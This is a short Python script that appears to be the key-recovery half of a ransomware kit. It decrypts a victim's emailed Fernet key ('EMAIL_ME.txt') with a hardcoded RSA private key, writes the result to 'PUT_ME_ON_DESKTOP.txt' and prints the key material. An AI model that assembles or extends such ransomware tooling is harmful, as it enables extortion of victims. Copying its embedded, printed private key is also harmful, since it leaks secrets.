from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP


privatekey='''-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAnArEz5F2J43Bg6KQS/MkdJ+lf+L63azLkI4fY5QIGUJ3dMHU
6JCHtLXk9SF8dRKbp382iXhI3w1p3XDXiJCrrAT11BVVuUEmLNxD6vmf6DkVMrHs
XwAGftYjfa8MoMdL3V9UFZHiOMH+B1mEUNnOMYA8j2IAL4ncwzySHbiUqQeKOg9B
N5hPW4Lj0DfqembyA6uYWizkhIf+Mdrql9uiuoBZhTpnsMQA5sjUyYXrtmoM7Ngg
2oM3/isKPSWxzfdaSikmaGK2VNJPBxtMShq3+dw1BkOKb6Zn8NGIQ/z+l8ETdyOG
djE64Gy4f8VeACrMQlZWND7nyfYTd2p39zMzGQIDAQABAoIBACUH3jR3K//PgYbM
b6uCgFqH33X1xvyP6wA7ZiISyYg7EI++BxmI4Rem2fa9c2RyHcvWYfomOD7s1zyE
sLWZRZBNXgxuYrlTx2w6eoi7JDJvR4NQG4zg++miRmpnfhryqOOYYaM7y2CWUwNq
AD9SrP7s1JJfWrVtZV1U1MUmXmstPshtZo31wxui+0E6pHxCih65GWxM9dlyDSqH
fJs/A/OmEhTpKv5uYeTDy6Fu5299huEEO2q8xej/ENvTO8JonAOA/l14VXVO7xV0
vm1LgJZIOadYQej2zGfJ3/JSET/XFkinUWXGKuzJs1MaC9CbIJtQCYOJuoyjqefW
F3VM5Z0CgYEAxvAln8KPHuwJgDuZ2RnpWzDmO7+iZAvMTBd9fIZTpzslykMFRhyL
kvK/99PcisLV1VUIKur9jXfuXXDcvgGO1or3mOLujlVJhTHaoFqzWYBW+C/fVDkE
Cp1h4BkTFQbLd7SDTMhlLIdbWR+cPl54bIM9TyoEMKnr2Hrz3B6FiC0CgYEAyMzN
9Rn9Y+qGPfQQJ0uPpuikkAOtg58EVRTaOFWwxG58Yq09Svdfwnxg++rVnQIIFQBa
UTc3EytQ3JEoorjLSOmVFL7u68nzQRJmkZ9/1KluQqi5bge2FPDvKlfkB+VBG+LL
pXAHiiQa+rNbNXz3jFmqALbDrbEKs/F9E62Dnh0CgYEAjNzcdzwnZUjTDWamcFBl
qPl9/M6bqOWlujdj1nmy4BYEkyxTnqp1tg6HGW99mQ+Oo+j6yJDuCm7ibG2PEEdA
Ie/yk+IT8tq3HUYIvUSb/ALhEgmrxBI/J1j7RdfbaCcQiWlbE1JOOXJ6nye/1XXF
JWjkT5q7rs2Svw2IgNNnz90CgYBUS2XKlvaAk1t3dpWxaU8Mym0K6ABXWNIAxZg2
PgLO83LUGdW5Os/AXWZ5WsQB/XBXIKbJoVxFd9GiRm3AocL1ANnMs7qo0UaE8qyM
RWDsbZQT97CgOCx/7gT4yZy4k80ZX8QN11HS9AU/aTvI4IUrLhjn49GRgNj1YVMY
h6bRIQKBgQCt8vddt+03iRs3k+WqM+WE1uH42m0exQ0TtqJ1d7FKOCCbIzJ9XjJo
wexgR+CiWeCfIwU6g0rRuu2BUqM4fAh/t4skffM1zOabLV4GUjm2lcnoIH12NhKf
LUZ+yquG4yD3XwJjiKgRXySqRTj6InkUPDDLLudb2ugJcTGooe0WCg==
-----END RSA PRIVATE KEY-----
'''

with open('EMAIL_ME.txt', 'rb') as f:
    enc_fernet_key = f.read()
    print(enc_fernet_key)

private_key = RSA.import_key(privatekey)

private_crypter = PKCS1_OAEP.new(private_key)

dec_fernet_key = private_crypter.decrypt(enc_fernet_key)
with open('PUT_ME_ON_DESKTOP.txt', 'wb') as f:
    f.write(dec_fernet_key)

print(f'> Private key: {private_key}')
print(f'> Private decrypter: {private_crypter}')
print(f'> Decrypted fernet key: {dec_fernet_key}')
print('> Decryption Completed')

